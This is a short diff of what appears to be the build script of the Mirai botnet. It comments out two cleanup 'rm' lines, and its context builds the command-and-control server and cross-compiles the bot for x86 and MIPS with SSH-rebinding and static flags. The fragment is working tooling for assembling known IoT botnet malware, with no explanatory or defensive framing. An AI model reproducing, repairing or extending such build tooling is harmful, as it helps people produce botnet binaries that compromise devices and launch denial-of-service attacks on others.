@@ -21,8 +21,8 @@ fi
 if [ $# == 0 ]; then
     echo "Usage: $0 <debug | release> <telnet | ssh>"
 elif [ "$1" == "release" ]; then
-    rm release/mirai.*
-    rm release/miraint.*
+    #rm release/mirai.*
+    #rm release/miraint.*
     go build -o release/cnc cnc/*.go
     compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
